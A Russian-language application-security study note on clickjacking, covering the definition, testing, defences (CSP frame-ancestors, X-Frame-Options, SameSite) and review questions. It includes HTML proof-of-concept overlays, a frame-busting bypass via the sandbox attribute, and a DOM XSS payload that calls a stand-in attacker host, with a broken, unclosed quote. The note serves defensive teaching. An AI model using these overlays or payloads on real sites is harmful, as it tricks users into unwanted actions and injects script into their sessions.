# Clickjacking (Кликджекинг)

## 1. Что это такое?
`Clickjacking (Кликджекинг)` — это атака на стороне клиента (UI-redressing), при которой злоумышленник с помощью `CSS/HTML` накладывает целевой уязвимый сайт внутри невидимого `iframe` (прозрачность `opacity` близка к 0) поверх легитимного сайта-приманки.

* **Суть**: Пользователь думает, что кликает по кнопке сайта-приманки (например, «Получить приз»), но фактически совершает критическое действие на скрытом целевом сайте (например, подтверждает оплату или удаляет аккаунт).
* **Отличие от CSRF**: При CSRF запрос отправляется автоматически без ведома пользователя, а **при кликджекинге пользователь должен кликнуть сам**. Из-за этого CSRF-токены не защищают от кликджекинга (запрос легитимен, сессия создается в контексте реального сайта).

## 2. Методы поиска (Тестирование)
Для выявления уязвимости проверяется возможность рендеринга страницы во фреймах сторонних ресурсов:
* Ручной PoC: Написание базовой HTML-страницы с тегом `<iframe src="target-url">` и проверка, блокирует ли браузер отображение.
* Автоматизация через `Burp Clickbandit`: Встроенный инструмент в `Burp Suite`. Скрипт вставляется в JS-консоль браузера на целевой странице, записывает клики и автоматически генерирует готовый HTML-файл эксплойта.

## 3. Примеры уязвимостей с кодом
Кликджекинг часто используется как вектор доставки для других уязвимостей, например, DOM XSS.

### Пример 1: Базовая атака (HTML/CSS)
Злоумышленник выставляет `z-index` скрытого фрейма выше, чем у приманки, и делает его прозрачным.
```html
<style>
    #decoy_website { position: absolute; width: 300px; height: 400px; z-index: 1; }
    #target_website { position: relative; width: 128px; height: 128px; opacity: 0.00001; z-index: 2; }
</style>
<div id="decoy_website">⚡️ [ Кнопка: ПОЛУЧИТЬ ПРИЗ ] ⚡️</div>
<iframe id="target_website" src="https://vulnerable-bank.com"></iframe>
```
### Пример 2: Комбинация Clickjacking + DOM XSS (JS/HTML)
Если на целевом сайте есть `DOM XSS` в параметре поиска, атакующий передает полезную нагрузку в URL фрейма. При клике на приманку выполнится вредоносный JS-скрипт в контексте жертвы.
```html
<!-- Код на сайте атакующего -->
 <!-- Целевой JS на vulnerable.com: document.getElementById("res").innerHTML = location.search; -->
<iframe src="https://vulnerable.com<script>fetch('http://attacker.com)</script>" 
        style="opacity:0; z-index:2; position:absolute;">
</iframe>
<button style="z-index:1;">Скачать бесплатную игру</button>
```
### Пример 3: Обход Frame-Busting защиты через HTML5 Sandbox
Старая JS-защита («разрушители кадров»), проверяющая `top.location`, обходится атрибутом `sandbox` без флага `allow-top-navigation`.
```html
<!-- Браузер выполнит форму во фрейме, но запретит скрипту сайта обновить верхнее окно и прервать атаку -->
<iframe src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```

## 4. Методы защиты (Рекомендации AppSec)
Защита должна реализовываться **на стороне сервера через HTTP-заголовки ответа**, запрещающие или ограничивающие встраивание страниц во фреймы.
1. **Content Security Policy (CSP)** — Основной и самый гибкий метод:
    * Используется директива `frame-ancestors`. Она проверяет всю цепочку родительских фреймов.
   ```
   Content-Security-Policy: frame-ancestors 'self'; -- Разрешено только своему домену
   Content-Security-Policy: frame-ancestors 'none'; -- Полный запрет фреймов
   Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com; -- Разрешено конкретным доменам
   ```
2. **X-Frame-Options (XFO)** — Устаревший, но важный для Legacy (для старых браузеров вроде IE):
   ```
   X-Frame-Options: deny -- Полный запрет
   X-Frame-Options: sameorigin -- Только текущий домен
   ```
    * Минус: **Не поддерживает множественные домены** (директива allow-from не поддерживается современными Chrome/Safari).
3. Защита Cookie (SameSite флаг):
   Установка **SameSite=Strict** (защита от CSRF) или **Lax** для сессионных кук частично защищает, так как браузер не будет передавать авторизационные куки в контексте стороннего фрейма при кросс-доменных запросах.
    * **Lax** - куки передаются при переходе по ссылке (GET), при **Strict** нет !!! Куки не отправляются при скрытых запросах (картинки, скрипты, iframe) или при отправке POST-форм со сторонних сайтов.

Основы защиты:
* Server-side защита заключается в добавлении заголовков (параметры ответа) `Content-Security-Policy: frame-ancestors` ... и `X-Frame-Options`.
* Флаге `SameSite` для сессионных Cookie запрещает передачу кук не просто «на других вкладках», а именно при кросс-доменных (cross-site) запросах.

## Вопросы
1. **Почему CSRF-токены не защищают от кликджекинга?** — Потому что при кликджекинге действие происходит внутри легитимного фрейма, загруженного с целевого сайта, браузер автоматически прикрепляет к нему правильный CSRF-токен из текущей сессии.

2. **В чем разница между директивой frame-src и frame-ancestors в CSP?** — `frame-src` управляет тем, какие сайты **наша страница может встраивать** внутрь себя через iframe, а `frame-ancestors` определяет, **каким сторонним сайтам разрешено встраивать нашу страницу** в свои фреймы (именно она защищает от кликджекинга).

3. **Что произойдет, если сервер одновременно вернет X-Frame-Options: Deny и Content-Security-Policy: frame-ancestors 'self'?** — Согласно стандарту, современные браузеры проигнорируют X-Frame-Options и отдадут приоритет более современной политике **CSP**, однако XFO сработает для старых браузеров.

4. **Как защитить приложение от кликджекинга, если по бизнес-логике его функционал ДОЛЖЕН встраиваться на сайт конкретного партнера?** — Использовать заголовок `Content-Security-Policy: frame-ancestors 'self' https://partner.com`, что позволит рендерить фрейм только на своем домене и домене партнера.

5. **Поможет ли флаг куки SameSite=Lax защитить от кликджекинга, если целевое действие выполняется через GET-запрос (например, клик по ссылке)?** — Нет, не поможет, потому что `SameSite=Lax` разрешает отправку кук при кросс-доменных переходах по ссылкам (GET-запросах), инициированных пользователем, поэтому для полной защиты критические действия должны выполняться строго через POST-запросы с защитой `SameSite=Strict` или контролироваться через `CSP`.

6. **Как атакующий может обойти старую JS-защиту Frame-Busting (код вида if (top != self) top.location = self.location)?** — Злоумышленник может использовать HTML5-атрибут sandbox для своего iframe (`<iframe src="url" sandbox="allow-forms allow-scripts">`), не указывая флаг allow-top-navigation, что заблокирует встроенному сайту возможность перенаправлять верхнее окно браузера.

7. **Почему для защиты от кликджекинга нельзя полагаться только на проверку заголовка Referer на бэкенде?** — Заголовок **Referer** может быть заблокирован политиками конфиденциальности браузера (Referrer-Policy), изменен пользователем или вовсе отсутствовать при определенных типах переходов, что делает его крайне ненадежным фактором защиты UI.
